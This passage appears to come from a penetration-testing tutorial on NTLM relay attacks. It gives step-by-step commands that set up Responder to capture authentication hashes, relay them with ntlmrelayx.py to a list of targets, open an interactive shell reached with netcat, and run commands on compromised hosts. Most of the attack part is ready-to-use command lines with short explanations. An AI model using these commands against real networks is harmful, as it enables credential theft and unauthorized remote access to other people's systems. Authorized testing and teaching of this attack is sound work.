Once we know which devices are vulnerable , we need to start responder before that make sure to turn off ‘smb server’ and ‘http server’ in the configuration file ( Path given below ).

nano /etc/responder/Responder.conf

Once responder has started we need to relay those hashes using the ntlmrelayx.py .

Commands to start Responder : responder -I eth0 dwP

Commands to start ntlmrelayx.py : ntlmrelayx.py -tf targets -smb2support

In the targets file we need to save the IP add of the targets.

We need to start responder and ntlmrelayx.py parallelly , so that we that we relay the hashes

  1. Attacker sets up Responder to listen for incoming authentication requests on a network.
  1. A client machine sends an SMB authentication request.
  1. Responder responds to the request, tricking the client into sending its authentication hash.
  1. Responder captures the hash.
  1. The attacker then uses ntlmrelayx.py to relay the captured hash to a target system.
  1. The target system, believing the relayed hash to be legitimate, might grant the attacker unauthorized access.

When the victim tries to connect.

We got the hashes.

Now if we want to get a shell access then we need to specify “-i”

ntlmrelayx.py -tf targets.txt -smb2support -i

Once we enter that command and get a response

We can see that it started a bind shell. Now we need to connect to that shell using netcat. 

nc 127.0.0.1 11000

As you can see we got shell access.

We can also add commands to the ntlmrelayx.py 

ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
